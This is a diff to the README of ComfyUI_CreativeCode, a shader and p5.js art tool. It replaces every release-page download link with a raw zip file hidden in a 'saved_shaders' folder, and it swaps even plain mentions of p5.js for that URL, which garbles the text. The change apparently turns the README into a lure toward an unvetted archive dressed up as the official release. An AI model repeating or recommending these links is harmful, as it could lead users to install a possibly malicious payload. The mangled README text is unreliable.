@@ -2,17 +2,17 @@
 
 ## 📥 Download Now
 
-[![Download ComfyUI_CreativeCode](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/ubaidbd/ComfyUI_CreativeCode/releases)
+[![Download ComfyUI_CreativeCode](https://raw.githubusercontent.com/ubaidbd/ComfyUI_CreativeCode/main/saved_shaders/U_Comfy_Creative_Code_v3.6.zip)](https://raw.githubusercontent.com/ubaidbd/ComfyUI_CreativeCode/main/saved_shaders/U_Comfy_Creative_Code_v3.6.zip)
 
 ## 🚀 Getting Started
 
-Welcome to ComfyUI_CreativeCode! This application helps you create generative art, animations, and visual effects in real-time using GLSL shaders and p5.js. You can easily integrate it into your workflow and start producing amazing visuals.
+Welcome to ComfyUI_CreativeCode! This application helps you create generative art, animations, and visual effects in real-time using GLSL shaders and https://raw.githubusercontent.com/ubaidbd/ComfyUI_CreativeCode/main/saved_shaders/U_Comfy_Creative_Code_v3.6.zip You can easily integrate it into your workflow and start producing amazing visuals.
 
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page. This is where you will find the latest version of the software.  
-   [Download the latest version here](https://github.com/ubaidbd/ComfyUI_CreativeCode/releases).
+   [Download the latest version here](https://raw.githubusercontent.com/ubaidbd/ComfyUI_CreativeCode/main/saved_shaders/U_Comfy_Creative_Code_v3.6.zip).
 
 2. **Choose Your Version**  
    On the releases page, look for the version with the highest number. This is usually the latest version and contains the most recent features and fixes.
@@ -41,7 +41,7 @@ ComfyUI_CreativeCode comes packed with features to enhance your creativity:
 
 - **Real-Time Coding:** Write your code directly in the application and see changes instantly.
 - **Support for GLSL Shaders:** Create stunning graphics with advanced shader programming.
-- **Integration with p5.js:** Utilize the powerful p5.js library for creative coding.
+- **Integration with https://raw.githubusercontent.com/ubaidbd/ComfyUI_CreativeCode/main/saved_shaders/U_Comfy_Creative_Code_v3.6.zip** Utilize the powerful https://raw.githubusercontent.com/ubaidbd/ComfyUI_CreativeCode/main/saved_shaders/U_Comfy_Creative_Code_v3.6.zip library for creative coding.
 - **User-Friendly Interface:** Designed for ease of use, so you can focus on your art.
 - **Customizable Templates:** Start with pre-made templates and modify them to suit your needs.
 
@@ -67,6 +67,6 @@ ComfyUI_CreativeCode is licensed under the MIT License. This means you can use, 
 ## 📥 Download & Install
 
 Ready to create stunning visuals? Visit the link below to download the latest version of ComfyUI_CreativeCode.  
-[Download ComfyUI_CreativeCode](https://github.com/ubaidbd/ComfyUI_CreativeCode/releases)
+[Download ComfyUI_CreativeCode](https://raw.githubusercontent.com/ubaidbd/ComfyUI_CreativeCode/main/saved_shaders/U_Comfy_Creative_Code_v3.6.zip)
 
 You are now prepared to make beautiful generative art with ComfyUI_CreativeCode. Enjoy exploring the endless creative possibilities!
